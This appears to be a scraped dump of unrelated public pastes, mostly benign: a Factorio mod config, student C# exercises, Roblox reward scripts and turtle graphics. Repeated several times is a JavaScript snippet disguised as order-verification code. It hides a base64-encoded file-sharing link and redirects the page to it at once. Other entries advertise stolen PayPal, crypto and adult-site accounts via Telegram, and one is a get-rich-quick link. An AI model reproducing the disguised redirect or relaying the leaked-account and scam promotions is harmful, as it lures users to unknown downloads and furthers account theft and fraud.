    ['kr-hydrogen']                                            ={r=255, g=255, b=255, a=127}, --Hydrogen
    ['kr-matter']                                              ={r=000, g=255, b=223, a=127}, --Matter
    ['kr-mineral-water']                                       ={r=034, g=000, b=204, a=127}, --Mineral water
    ['kr-nitric-acid']                                         ={r=255, g=000, b=058, a=127}, --Nitric acid
    ['kr-nitrogen']                                            ={r=000, g=028, b=255, a=127}, --Nitrogen
    ['kr-oxygen']                                              ={r=255, g=128, b=128, a=127}, --Oxygen

}

Krastorio2_filters={
    ""kr-additional-engine"",
    ""kr-advanced-additional-engine"",
    ""kr-advanced-exoskeleton-equipment"",
    ""kr-antimatter-artillery-shell"",
    ""kr-antimatter-railgun-shell"",
    ""kr-antimatter-rocket"",
    ""kr-artillery-shell"",
    ""kr-atomic-bomb"",
    ""kr-automation-science-pack"",
    ""kr-basic-railgun-shell"",
    ""kr-battery-mk2-equipment"",
    ""kr-battery-mk3-equipment"",
    ""kr-big-battery-equipment"",
    ""kr-big-battery-mk2-equipment"",
    ""kr-big-battery-mk3-equipment"",
    ""kr-big-imersite-solar-panel-equipment"",
    ""kr-big-solar-panel-equipment"",
    ""kr-chemical-science-pack"",
    ""kr-coke"",
    ""kr-dolphin-gun"",
    ""kr-electronic-components"",
    ""kr-energy-shield-equipment"",
    ""kr-energy-shield-mk2-equipment"",
    ""kr-energy-shield-mk3-equipment"",
    ""kr-energy-shield-mk4-equipment"",
    ""kr-enriched-copper"",
    ""kr-enriched-iron"",
    ""kr-explosion-railgun-shell"",
    ""kr-firearm-magazine"",
    ""kr-fusion-reactor-equipment"",
    ""kr-glass"",
    ""kr-heavy-rocket"",
    ""kr-heavy-rocket-launcher"",
    ""kr-imersite-night-vision-equipment"",
    ""kr-imersite-powder"",
    ""kr-imersite-rounds-magazine"",
    ""kr-imersite-solar-panel-equipment"",
    ""kr-impulse-rifle-ammo"",
    ""kr-impulse-rifle"",
    ""kr-iron-gear-wheel"",
    ""kr-iron-plate"",
    ""kr-lithium-chloride"",
    ""kr-lithium"",
    ""kr-logistic-science-pack"",
    ""kr-matter-cube"",
    ""kr-matter-research-data"",
    ""kr-matter-stabilizer"",
    ""kr-military-science-pack"",
    ""kr-personal-laser-defense-equipment"",
    ""kr-personal-laser-defense-mk2-equipment"",
    ""kr-personal-sniper-laser-defense-mk1-equipment"",
    ""kr-personal-sniper-laser-defense-mk2-equipment"",
    ""kr-personal-submachine-laser-defense-mk1-equipment"",
    ""kr-personal-submachine-laser-defense-mk2-equipment"",
    ""kr-personal-submachine-laser-defense-mk3-equipment"",
    ""kr-personal-submachine-laser-defense-mk4-equipment"",
    ""kr-piercing-rounds-magazine"",
    ""kr-portable-generator"",
    ""kr-power-armor-mk3"",
    ""kr-power-armor-mk4"",
    ""kr-production-science-pack"",
    ""kr-pumpjack"",
    ""kr-quartz"",
    ""kr-raw-imersite"",
    ""kr-sand"",
    ""kr-shield-generator-mk1"",
    ""kr-shield-generator-mk2"",
    ""kr-shield-generator-mk3"",
    ""kr-shield-generator-mk4"",
    ""kr-silicon"",
    ""kr-small-portable-generator"",
    ""kr-space-science-pack"",
    ""kr-steel-gear-wheel"",
    ""kr-steel-plate"",
    ""kr-utility-science-pack"",
    ""kr-vehicle-roboport"",

    ""kr-ammonia"",
    ""kr-chlorine"",
    ""kr-dirty-water"",
    ""kr-heavy-water"",
    ""kr-hydrogen-chloride"",
    ""kr-hydrogen"",
    ""kr-nitric-acid"",
    ""kr-nitrogen"",
    ""kr-oxygen"",
}"
NsPdFgqn,Market.js,jm33,JavaScript,Saturday 26th of April 2025 06:12:48 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/23830/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
acCgxTXN,PayPal with Balance,hubertzoo90,JavaScript,Saturday 26th of April 2025 06:11:17 AM CDT,99041 Accounts Posted On https://t.me/leakedbyem1nem
YPyuinFg,EARN $900 INSTANTLY 2025‚≠ê NU,Mero2826,JavaScript,Saturday 26th of April 2025 06:10:25 AM CDT," 
Pdf https://tinyurl.com/privguidee

0TpUepTg72
"
R4gtivyC,Program,cuniszkiewicz,C#,Saturday 26th of April 2025 06:06:20 AM CDT,"using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace OOP_1N122L_grafika_lato_2025
{
    internal class Program
    {
        static void Main(string[] args)
        {
            Student student = new Student();
            Student student2 = new Student();
            Student student3 = new Student(""Anna"", ""Nowak"", 21, 4.5);
            Student student4 = new Student(""Zbigniew"", ""Sprƒô≈ºyna"");
            Student student5 = new Student(student3);

            student.imie = ""John"";
            student.nazwisko = ""Snow"";
            //student.wiek = 30;
            student.UstawWiek(3);
            //student.sredniaOcen = 4.5;
            student.UstawSredniaOcen(3.5);
            /*
            student.PrzedstawSie();
            student2.PrzedstawSie();
            student3.PrzedstawSie();
            student4.PrzedstawSie();
            student5.PrzedstawSie();

            student.Wiek = 30;

            student.TemperaturaC = 37;
            Console.WriteLine($""Temperatura {student.imie} to {student.TemperaturaC}C."");
            Console.WriteLine($""Temperatura {student.imie} to {student.TemperaturaK}K."");
            student.TemperaturaK = 310.15;
            Console.WriteLine($""Temperatura {student.imie} to {student.TemperaturaC}C."");
            Console.WriteLine($""Temperatura {student.imie} to {student.TemperaturaK}K."");

            Console.WriteLine(Student.uczelnia);  
            */

            StudentInformatyki studentInformatyki = new StudentInformatyki();

            studentInformatyki.PrzedstawSie();


            
            /*
            student.ZdajEgzamin(""Matematyka"", 3.5);

            Console.WriteLine($""Ocena jakƒÖ uzyska≈Ç student "" +
                $""przy 98% to: {student.JakaOcena(98)}."");

            Console.WriteLine($""Wiek studenta to: {student.PokazWiek()} lat"");
            */
            Console.ReadKey();


        }
    }
}
"
pDiqpT4v,Student,cuniszkiewicz,C#,Saturday 26th of April 2025 06:05:02 AM CDT,"using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace OOP_1N122L_grafika_lato_2025
{
    internal class Student
    {
        //pola
        public static string uczelnia = ""WSG"";
        public string imie;
        public string nazwisko;
        private int wiek;
        private double sredniaOcen;

        //w≈Ça≈õciwo≈õci

        public int Wiek
        {
            get { return wiek; }
            set {
                if (value > 17)
                    wiek = value;
                else
                    wiek = 19;
            }
        }

        private double temperatura;

        public double TemperaturaC
        {
            get { return temperatura; }
            set {
                if (value >= 34 && value <= 41)
                    temperatura = value;
                else
                    temperatura = 36.6;
            }
        }

        public double TemperaturaK
        {
            get { return temperatura + 273.15; }
            set
            {
                if (value >= 307.15 && value <= 314.15)
                    temperatura = value - 273.15;
                else
                    temperatura = 36.6;
            }
        }

        //konstruktor

        public Student()
        {
            imie = ""Jan"";
            nazwisko = ""Kowalski"";
            wiek = 25;
            sredniaOcen = 4;
        }
        public Student(string _imie, string _nazwisko, int _wiek = 19, double _sredniaOcen = 5)
        {
            imie = _imie;
            nazwisko = _nazwisko;
            wiek = _wiek;
            sredniaOcen = _sredniaOcen;
        }

        public Student(Student przykladowyStudent)
        { 
            imie = przykladowyStudent.imie;
            nazwisko = przykladowyStudent.nazwisko;
            wiek = przykladowyStudent.wiek;
            sredniaOcen = przykladowyStudent.sredniaOcen;
        }

        //metody
        public void PrzedstawSie()
        {
            Console.WriteLine($""Student: {imie} {nazwisko}, "" +
                    $""wiek: {wiek}, ≈õrednia: {sredniaOcen}."");
        }

        public void ZdajEgzamin(string przedmiot, double ocena)
        {
            Console.WriteLine($""Student zda≈Ç egazmin z przedniotu: {przedmiot} na ocenƒô: {ocena}."");

        }

        public double JakaOcena(int procenty)
        {
            double ocena = 2.0;
            if (procenty < 50 || procenty > 100)
                ocena = 2.0;
            if (procenty >= 50 && procenty < 75)
                ocena = 3.0;
            if (procenty >= 75 && procenty < 80)
                ocena = 3.5;
            if (procenty >= 80 && procenty < 85)
                ocena = 4.0;
            if (procenty >= 85 && procenty < 90)
                ocena = 4.5;
            if (procenty >= 90 && procenty <= 100)
                ocena = 5.0;

            return ocena;
        
        }

        public void UstawWiek(int _wiek)
        {
            if (_wiek > 17)
                wiek = _wiek;
            else
                wiek = 19;
        }
        public void UstawSredniaOcen(double _srednia)
        {
            if (_srednia >= 3 && _srednia <= 5)
                sredniaOcen = _srednia;
            else
                sredniaOcen = 3;
        }

        public int PokazWiek()
        { return wiek; }

        public double PokazSredniaOcen()
        { return sredniaOcen; }
    }
}
"
v8WWXWKP,dataNone,TestGuy1,JSON,Saturday 26th of April 2025 06:00:05 AM CDT,"{
  status: 'Success',
  method: 'server',
  maindata: 'e6b5570800833bb281f2088a07bfbbb5c6db218250847dd00327444428f9e479188de1f8bab1bca727076c46def3a0033313d301139d13343d68589f3585ff35144b96cc46de24c126d71ea88b21dc9dad92d100312753896da0b20d4a103a52e14a32b04bde152f486a0fafafd19bc261fc9370c4bfc4229354ce9012ee7a3d',
  otherdata: [
    '1449cd9d8cfbed1ee204e64403f3543a',
    'e8b4c2dced985b2ed72e3de3aa24c337',
    '490758dcf262539a96821283823aed72',
    '6c8a0b3aff4270b77c83105ff43c4d53',
    '5ffc01dd87ffe61be140af45aa52567a',
    '5467ee373507a415e3f9e3f6f0639d62',
    '2ede60ffdea809bcb3ba8ea330b07f65',
    'ca84f48bdcdfdfe18e5061fa56b2ad13'
  ]
}"
Q2Dp9d7P,Untitled,jm33,JavaScript,Saturday 26th of April 2025 05:57:25 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/38320/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
63fPQhut,tablice,Cassimus,C#,Saturday 26th of April 2025 05:57:19 AM CDT,"// string[] uczestnicy = new string[4];
// uczestnicy[0] = ""Szymon"";
// uczestnicy[1] = ""Artur"";
// uczestnicy[2] = ""Szymon"";
// uczestnicy[3] = ""Grzesiek"";

//string[] uczestnicy = new string[6]{""Szymon"",""Artur"", ""szymon"", ""Grzesiek""};

// string[] uczestnicy = [""Szymon"", ""Artur"", ""Szymon"", ""Grzesiek"", ""Jola"", ""Mariola""];

// for (int i = 0; i < uczestnicy.Length; i++)
// {
//     System.Console.WriteLine(uczestnicy[i]);
// }

// string[] bibliotekaGier = { ""Baldurs Gate3"", ""Guild Wars2"", ""Assasins Creed: Valhala"", ""Settlers 2"" };

// for (int i = 0; i < bibliotekaGier.Length; i++)
// {
//     System.Console.WriteLine(bibliotekaGier[i]);
// }

// Random maszynaLosujaca = new Random();
// int wylosowanyIndex = maszynaLosujaca.Next(0, bibliotekaGier.Length);

// System.Console.WriteLine($""Proponujƒô zagraƒá wieczorem w {bibliotekaGier[wylosowanyIndex]}"");

int[] liczby = new int[5];

int counter=0;

while (counter < liczby.Length)
{
    System.Console.WriteLine(""Podaj liczbƒô i naci≈õnij ENTER"");
    liczby[i] = int.Parse(Console.ReadLine());
}

foreach(int element in liczby)
{
    Console.WriteLine(element);2
}
"
d8uej9KZ,Leaked Accounts - Fresh Hits,hubertzoo90,JavaScript,Saturday 26th of April 2025 05:55:55 AM CDT,46557 Accounts Posted On https://t.me/leakedbyem1nem
m424NAJK,Products.js,jm33,JavaScript,Saturday 26th of April 2025 05:42:02 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/96585/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
7yb9E9iG,Chaturbate with Tokens,hubertzoo90,JavaScript,Saturday 26th of April 2025 05:40:32 AM CDT,24923 Accounts Posted On https://t.me/leakedbyem1nem
gKgxHc39,Order.js,jm33,JavaScript,Saturday 26th of April 2025 05:26:38 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/24976/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
ixsseWx9,Crypto Accounts,hubertzoo90,JavaScript,Saturday 26th of April 2025 05:25:09 AM CDT,89847 Accounts Posted On https://t.me/leakedbyem1nem
CWQRXLYb,Untitled,dllbridge,C,Saturday 26th of April 2025 05:19:18 AM CDT,"

#include  <iostream>
#include    <vector>
using namespace std;

const int nSize = 17;

void monitor_nArr  (int         *p);
void monitor_vector(vector<int> &r);



////////////////////////////////////////////////////////
int main()                                            //
{
    
    setlocale(LC_ALL, ""rus"");
    vector<int>   v1, v2; 

    int nArr[nSize];
    
    for(int i = 0; i < nSize; i++)
    {
             
                     nArr[i] = i + 10; 
        v1.push_back(nArr[i]);      
    }
	
	monitor_nArr(nArr);
	monitor_vector(v1);
}



//////////////////////////////////////////////////////
void monitor_nArr(int *p)                           //  
{
    
     cout << ""–°–æ–¥–µ—Ä–∂–∏–º–æ–µ —Ü–µ–ª–æ—á–∏—Å–ª–µ–Ω–Ω–æ–≥–æ –º–∞—Å—Å–∏–≤–∞: ""
          <<  endl; 
    
     for(int i = 0; i < nSize; i++)
     {
             
         cout << p[i] << "", "";       
     }   cout << endl;     
}

//////////////////////////////////////////////////////
void monitor_vector(vector<int> &r)                 //  
{
    
     cout << ""–°–æ–¥–µ—Ä–∂–∏–º–æ–µ vector: "" << endl; 
    
     for(int i = 0; i < nSize; i++)
     {
             
         cout << r[i] << "", "";       
     }   cout << endl;     
}




"
jj8rBYnE,Market.js,jm33,JavaScript,Saturday 26th of April 2025 05:11:15 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/56576/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
j6sp0RzQ,PayPal with Balance,hubertzoo90,JavaScript,Saturday 26th of April 2025 05:09:46 AM CDT,07017 Accounts Posted On https://t.me/leakedbyem1nem
eHdpaQ5c,2025-04-26T15:37:27.324,powerampache,PHP,Saturday 26th of April 2025 05:07:28 AM CDT,"1.01-80-play (80) - DB: 83
retrofit2.HttpException: HTTP 404 { ""exception"" : ""Failed to connect to play.dogmazic.net/91.224.149.251:443"" }
	at retrofit2.KotlinExtensions$await$2$2.onResponse(KotlinExtensions.kt:53)
	at retrofit2.OkHttpCall$1.onResponse(OkHttpCall.java:164)
	at okhttp3.internal.connection.RealCall$AsyncCall.run(RealCall.kt:529)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1167)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:641)
	at java.lang.Thread.run(Thread.java:923)

getSongsFromAlbum() - cannot load data HttpException {""code"":404,""message"":""{ \""exception\"" : \""Failed to connect to play.dogmazic.net/91.224.149.251:443\"" }"",""detailMessage"":""HTTP 404 { \""exception\"" : \""Failed to connect to play.dogmazic.net/91.224.149.251:443\"" }"",""stackTrace"":[],""suppressedExceptions"":[]}"
sn5g2Dtz,PYRO_16_V6,Ilxom1991,Python,Saturday 26th of April 2025 05:04:59 AM CDT,"'C7950FD2-0B3B-4913-924A-741C1E4C142B'
'B2BA27C2-6597-4555-AE02-3239FD181C4E'
'DBD2C2CC-87F2-11EC-810F-E4A8DFB1BC13'
'3825E524-FB6F-EA11-80D6-089798950D10'
'03000200-0400-0500-0006-000700080009'"
2V48gMHb,Amogus,Dimaush,Python,Saturday 26th of April 2025 05:04:07 AM CDT,"import turtle as t
t.speed(0)
t.left(90)
t.penup()


def arch(color, level, side, size, leg):
  global t
  
  t.pencolor(color)
  t.pendown()
  t.fillcolor(color)
  t.begin_fill()
  t.forward(10 * leg * size)
  if side == ""left"":
    t.left(180)
    t.circle((10 - 3 * level) * size, -90)
  else:
    t.circle((10 - 3 * level) * size, 90)
  t.left(90)
  t.forward(3 * size)
  t.right(90)
  if side == ""left"":
    t.circle((7 - 3 * level) * size, 90)
  else:
    t.circle((7 - 3 * level) * size, -90)
    t.left(180)
  t.forward(10 * leg * size)
  if side == ""left"":
    t.right(90)
  else:
    t.left(90)
  t.forward(3 * size)
  t.end_fill()
  if side == ""left"":
    t.right(90)
  else:
    t.left(90)
  t.penup()


def magnet(size, leg):
  global t
  
  arch(""red"", 0, ""left"", size, leg)
  
  t.right(90)
  t.forward(3 * size)
  t.left(90)
  
  arch(""yellow"", 1, ""left"", size, leg)
  
  t.right(90)
  t.forward(14 * size)
  t.left(90)
  
  arch(""green"", 1, ""right"", size, leg)
  
  t.right(90)
  t.forward(3 * size)
  t.left(90)

  arch(""blue"", 0, ""right"", size, leg)
  
  t.left(90)
  t.forward(20 * size)
  t.right(90)


def many_magnets():
  k = 2
  for i in range(3):
    magnet(k, i)
    t.left(90)
    t.forward(15 * k)
    t.right(90)
    k *= 2.5


def amogus(size, color):
  global t
  
  # body
  t.forward(5 * size)
  t.pencolor(color)
  t.pendown()
  t.fillcolor(color)
  t.begin_fill()
  t.forward(10 * size)
  t.forward(15 * size)
  t.circle(20 * size, 180)
  t.forward(15 * size)
  t.forward(10 * size)
  t.circle(5 * size, 180)
  t.forward(10 * size)
  t.right(90)
  t.forward(20 * size)
  t.right(90)
  t.forward(10 * size)
  t.circle(5 * size, 180)
  t.end_fill()
  t.penup()
  
  # eye
  t.forward(25 * size)
  t.left(90)
  t.forward(10 * size)
  t.right(90)
  t.pencolor(""lightblue"")
  t.pendown()
  t.fillcolor(""lightblue"")
  t.begin_fill()
  t.circle(10 * size, 180)
  t.left(60)
  t.circle(20 * size, 60)
  t.right(30)
  t.end_fill()
  t.penup()
  
  # bag
  t.forward(10 * size)
  t.pencolor(color)
  t.pendown()
  t.fillcolor(color)
  t.begin_fill()
  t.forward(5 * size)
  t.left(120)
  t.circle(15 * size, -60)
  t.left(120)
  t.forward(5 * size)
  t.end_fill()
  t.penup()
  
  t.right(90)
  t.backward(15 * size)


# -----

""""""
magnet(5, 2)
t.backward(100)
magnet(3, 4)
t.backward(40)
magnet(1, 5)
""""""

""""""
t.backward(180)
many_magnets()
""""""

t.backward(150)
amogus(5, ""pink"")
for i in range(2, 0, -1):
  t.right(90)
  t.forward(60 * i)
  t.left(90)
  amogus(i, ""green"")"
8nCZBrkK,Untitled,jm33,JavaScript,Saturday 26th of April 2025 04:55:53 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/15643/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
dtSm7WjT,Leaked Accounts - Fresh Hits,hubertzoo90,JavaScript,Saturday 26th of April 2025 04:54:23 AM CDT,52507 Accounts Posted On https://t.me/leakedbyem1nem
xBrfZsvf,Daily Rewards Module Script,Cakey3101,Lua,Saturday 26th of April 2025 04:52:37 AM CDT,"local DailyRewards = {
	[""1""] = {
		Type = ""Gems"", -- Type To Reward
		Amount = 25, -- Amount To Reward
	},
	[""2""] = {
		Type = ""Coins"", -- Type To Reward
		Amount = 50, -- Amount To Reward
	},
	[""3""] = {
		Type = ""Coins"", -- Type To Reward
		Amount = 100, -- Amount To Reward
	},
	[""4""] = {
		Type = ""Gems"", -- Type To Reward
		Amount = 50, -- Amount To Reward
	},
	[""5""] = {
		Type = ""Coins"", -- Type To Reward
		Amount = 250, -- Amount To Reward
	},
	[""6""] = {
		Type = ""Gems"", -- Type To Reward
		Amount = 125, -- Amount To Reward
	},
	[""7""] = {
		Type = ""Coins"", -- Type To Reward
		Amount = 500, -- Amount To Reward
	},
}

return DailyRewards"
TFM6w4KF,Data Script - Daily Rewards,Cakey3101,Lua,Saturday 26th of April 2025 04:51:43 AM CDT,"local Players = game:GetService(""Players"")
local DataStoreService = game:GetService(""DataStoreService"")

local DataStore = DataStoreService:GetDataStore(""MyDataStore2"")

local function PlayerAdded(Player: Player)
	local Leaderstats = Instance.new(""Folder"", Player)
	Leaderstats.Name = ""leaderstats""
	
	local Coins = Instance.new(""NumberValue"", Leaderstats)
	Coins.Name = ""Coins""
	Coins.Value = 0
	
	local Gems = Instance.new(""NumberValue"", Leaderstats)
	Gems.Name = ""Gems""
	Gems.Value = 0
	
	local DailyReward = Instance.new(""NumberValue"", Player)
	DailyReward.Name = ""DailyReward""
	DailyReward.Value = 1
	
	local LastCollectTime = Instance.new(""NumberValue"", Player)
	LastCollectTime.Name = ""LastCollectTime""
	LastCollectTime.Value = 0
	
	local Success, SavedData = pcall(function()
		return DataStore:GetAsync(Player.UserId)
	end)
	
	if Success and SavedData then
		Coins.Value = SavedData.Coins or 0
		Gems.Value = SavedData.Gems or 0
		DailyReward.Value = SavedData.DailyReward or 1
		LastCollectTime.Value = SavedData.LastCollectTime or 0
	else
		Coins.Value = 0
		Gems.Value = 0
		DailyReward.Value = 1
		LastCollectTime.Value = 0
	end
end

local function PlayerRemoving(Player: Player)
	local Leaderstats = Player:FindFirstChild(""leaderstats"")
	
	if Leaderstats then
		local CoinsValue = Leaderstats:FindFirstChild(""Coins"")
		local GemsValue = Leaderstats:FindFirstChild(""Gems"")
		local DailyRewardValue = Player:FindFirstChild(""DailyReward"")
		local LastCollectTime = Player:FindFirstChild(""LastCollectTime"")
		
		if CoinsValue and GemsValue and DailyRewardValue and LastCollectTime then
			pcall(function()
				DataStore:SetAsync(Player.UserId, {
					Coins = CoinsValue.Value,
					Gems = GemsValue.Value,
					DailyReward = DailyRewardValue.Value,
					LastCollectTime = LastCollectTime.Value,
				})
			end)
		end
	end
end

Players.PlayerAdded:Connect(PlayerAdded)
Players.PlayerRemoving:Connect(PlayerRemoving)"
itypgsbK,Daily Rewards Server Script,Cakey3101,Lua,Saturday 26th of April 2025 04:50:59 AM CDT,"local ReplicatedStorage = game:GetService(""ReplicatedStorage"")

local Remotes = ReplicatedStorage.Remotes
local DailyRewardsConfig = require(ReplicatedStorage.DailyRewards)

local function ClaimReward(Player: Player, Day: number)
	local DailyRewardStat = Player:FindFirstChild(""DailyReward"")
	local LastCollectTimeStat = Player:FindFirstChild(""LastCollectTime"")
	local Leaderstats = Player:FindFirstChild(""leaderstats"")
	
	local CurrentDay = DailyRewardStat.Value
	local LastCollectTime = LastCollectTimeStat.Value
	local CurrentTime = os.time()
	
	if CurrentDay ~= Day then return end
	if LastCollectTime ~= 0 and CurrentTime - LastCollectTime < 24 * 60 * 60 then return end
	
	local Reward = DailyRewardsConfig[tostring(Day)]
	if not Reward then return end
	
	local RewardStat = Leaderstats:FindFirstChild(Reward.Type)
	if RewardStat and RewardStat:IsA(""NumberValue"") then
		RewardStat.Value += Reward.Amount
		print(""Reward Claimed!"")
	end
	
	LastCollectTimeStat.Value = CurrentTime
	DailyRewardStat.Value = CurrentDay + 1
	
	Remotes.ClaimDailyReward:FireClient(Player)
end

Remotes.ClaimDailyReward.OnServerEvent:Connect(ClaimReward)"
KhkqzhxW,Daily Rewards Local Script,Cakey3101,Lua,Saturday 26th of April 2025 04:50:15 AM CDT,"local Players = game:GetService(""Players"")
local ReplicatedStorage = game:GetService(""ReplicatedStorage"")

local Remotes = ReplicatedStorage.Remotes
local DailyRewardsConfig = require(ReplicatedStorage.DailyRewards)

local Player = Players.LocalPlayer
local PlayerGui = Player.PlayerGui

local Gui = PlayerGui:WaitForChild(""DailyRewards"")
local Frame = Gui.Frame

local Exit = Frame.Exit
local Open = Gui.OpenButton

local Container = Frame.Container

local Template = Container.Template

local Days = {}

for Day in pairs(DailyRewardsConfig) do
	table.insert(Days, Day)
end

table.sort(Days, function(A, B)
	return tonumber(A) < tonumber(B)
end)

local function UpdateButtons()
	local DailyRewardsStat = Player:FindFirstChild(""DailyReward"")
	local LastCollectTime = Player:FindFirstChild(""LastCollectTime"")
	if not DailyRewardsStat or not LastCollectTime then return end
	
	local CurrentDay = DailyRewardsStat.Value
	local LastClaim = LastCollectTime.Value
	local CurrentTime = os.time()
	
	for _, DailyRewardTemplate in ipairs(Container:GetChildren()) do
		if DailyRewardTemplate:IsA(""Frame"") and tonumber(DailyRewardTemplate.Name) then
			local Day = tonumber(DailyRewardTemplate.Name)
			local ClaimButton = DailyRewardTemplate:FindFirstChild(""ClaimReward"")
			
			if not ClaimButton then continue end
			
			if Day < CurrentDay then
				ClaimButton.BackgroundColor3 = Color3.fromRGB(150, 150, 150)
				ClaimButton.Label.Text = `Claimed!`
				ClaimButton.AutoButtonColor = false
				ClaimButton.Active = false
			elseif Day == CurrentDay then
